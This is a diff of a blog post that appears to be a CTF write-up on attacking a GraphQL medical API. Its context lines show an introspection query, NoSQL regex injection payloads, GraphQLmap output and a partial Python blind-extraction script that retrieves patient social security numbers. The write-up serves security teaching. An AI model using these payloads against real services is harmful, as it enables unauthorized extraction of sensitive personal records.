@@ -17,7 +17,7 @@ Gobuster revealed a `/graphql` endpoint at the root of the website, browsing [ht
 
 There, we can get the structure of the `Doctor` type.
 
-{% highlight sql%}
+{% highlight sql %}
 type Doctor {
   id: ID!
   firstName: String!
@@ -32,7 +32,7 @@ type Doctor {
 
 It seems we don't need to authenticate with the mutation `signIn` to query `Doctor` data.
 
-{% highlight sql%}
+{% highlight sql %}
 type Mutation {
   signIn(login: String!, password: String!): Token!
 }
@@ -52,7 +52,7 @@ In this challenge we didn't have access to an online "lab" to test and query the
 
 Using `Introspection` we can still get the GraphQL schema, here is the URL-encoded version (Full version available at "[GraphQL Injection: enumerate-database-schema-via-introspection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection)").
 
-{% highlight sql%}
+{% highlight sql %}
 fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
 {% endhighlight %}
 
@@ -62,7 +62,7 @@ It is strongly recommended to use `Firefox` to view the server response as it pa
 
 Using GraphQLmap, we got the following structure.
 
-{% highlight sql%}
+{% highlight sql %}
 ============= [SCHEMA] ===============
 e.g: name[Type]: arg (Type!)
 
@@ -104,7 +104,7 @@ In this case `Doctors` have an `options` parameter which accepts JSON. It allows
 
 We can query `{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}`, don't forget to escape the `"` inside the `options`.
 
-{% highlight json%}
+{% highlight json %}
 GraphQLmap> {doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
 {
     "firstName": "Admin",
@@ -129,7 +129,7 @@ Goal: `I need to find the Patient 0 social security number! It is a matter of li
 
 Things are getting complicated, we can dump the schema as the `Introspection` is set to false. Based on the previous challenge we can guess the structure is the same. Unfortunately we can't reuse the same query to extract the `ssn`, we get the following error.
 
-{% highlight bash%}
+{% highlight bash %}
 Field "doctors" argument "search" of type "JSON!" is required, but it was not provided.
 {% endhighlight %}
 
@@ -137,14 +137,14 @@ This means there is a `search` argument in the doctor structure, something like 
 
 Let's try a simple NoSQL injection with fields we know such as `lastName`.
 
-{% highlight json%}
+{% highlight json %}
 OK: {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi\"} }"){firstName lastName id}}
 KO: {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admia\"} }"){firstName lastName id}}
 {% endhighlight %}
 
 Since the challenge I added a way to test the regex quickly in GraphQLmap using the `GRAPHQL_CHARSET` keyword inside a GraphQL query:
 
-{% highlight json%}
+{% highlight json %}
 GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}     
 [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi$\"} }"){firstName lastName id}}   
 [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi(\"} }"){firstName lastName id}}   
@@ -157,7 +157,7 @@ GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiG
 
 The injection worked, now we can re-use the payload from the challenge #2 and extract the `social security number` of the patient 0, which is the patient of the `Admin` doctor. The query was as follows, where we had to replace `CHARACTER_FROM_THE_FLAG` to test characters from the flag.
 
-{% highlight json%}
+{% highlight json %}
 {
   doctors(
     options: "{\"limit\": 1, \"patients.ssn\" :1}", 
@@ -170,7 +170,7 @@ The injection worked, now we can re-use the payload from the challenge #2 and ex
 
 Obviously we scripted the data extraction in Python, the script below will get the last flag : `4f537c0a-7da6-4acc-81e1-8c33c02ef3b`.
 
-{% highlight python%}
+{% highlight python %}
 def blind_nosql(URL):
     data = ""
     data_size = 35
@@ -188,7 +188,7 @@ def blind_nosql(URL):
 At that time we were checking if the content of `r.json()['data']['doctors']` was not empty, in order to abstract the data extraction we now take a check input from the user in order to compare the output.
 
 
-{% highlight json%}
+{% highlight json %}
 GraphQLmap > nosqli
 Query > {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
 Check > 5d089c51dcab2d0032fdd08d
